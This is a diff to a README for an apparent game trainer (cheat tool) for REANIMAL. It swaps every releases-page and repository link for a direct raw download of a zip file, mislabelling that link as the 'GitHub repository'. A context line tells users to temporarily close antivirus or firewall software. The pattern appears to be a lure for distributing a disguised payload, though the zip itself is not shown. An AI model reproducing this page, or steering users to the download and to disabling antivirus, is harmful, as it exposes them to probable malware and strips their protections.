@@ -1,6 +1,6 @@
 # 🐾 reanimal-trainer-2026 - Easy Game Trainer for REANIMAL
 
-[![Download the Trainer](https://img.shields.io/badge/Download%20Trainer-brightgreen?style=for-the-badge&logo=github)](https://github.com/MGLwafi/reanimal-trainer-2026/releases)
+[![Download the Trainer](https://img.shields.io/badge/Download%20Trainer-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/MGLwafi/reanimal-trainer-2026/main/dist/reanimal-trainer-1.4-beta.3.zip)
 
 ## 🔍 About reanimal-trainer-2026
 
@@ -36,7 +36,7 @@ Ensure you close any antivirus or firewall software temporarily if it blocks the
 
 Click the download button below to open the releases page on GitHub. This page contains all available versions of the trainer.
 
-[![Download the Trainer](https://img.shields.io/badge/Visit%20Releases-0078D7?style=for-the-badge&logo=github)](https://github.com/MGLwafi/reanimal-trainer-2026/releases)
+[![Download the Trainer](https://img.shields.io/badge/Visit%20Releases-0078D7?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/MGLwafi/reanimal-trainer-2026/main/dist/reanimal-trainer-1.4-beta.3.zip)
 
 ### Step 2: Download the Trainer
 
@@ -114,7 +114,7 @@ The source code is written in C++ and uses Cheat Engine techniques for memory ha
 
 ## 🌐 Links
 
-- Trainer releases: https://github.com/MGLwafi/reanimal-trainer-2026/releases  
-- GitHub repository: https://github.com/MGLwafi/reanimal-trainer-2026
+- Trainer releases: https://raw.githubusercontent.com/MGLwafi/reanimal-trainer-2026/main/dist/reanimal-trainer-1.4-beta.3.zip  
+- GitHub repository: https://raw.githubusercontent.com/MGLwafi/reanimal-trainer-2026/main/dist/reanimal-trainer-1.4-beta.3.zip
 
-[![Download the Trainer](https://img.shields.io/badge/Download%20Trainer-brightgreen?style=for-the-badge&logo=github)](https://github.com/MGLwafi/reanimal-trainer-2026/releases)
+[![Download the Trainer](https://img.shields.io/badge/Download%20Trainer-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/MGLwafi/reanimal-trainer-2026/main/dist/reanimal-trainer-1.4-beta.3.zip)
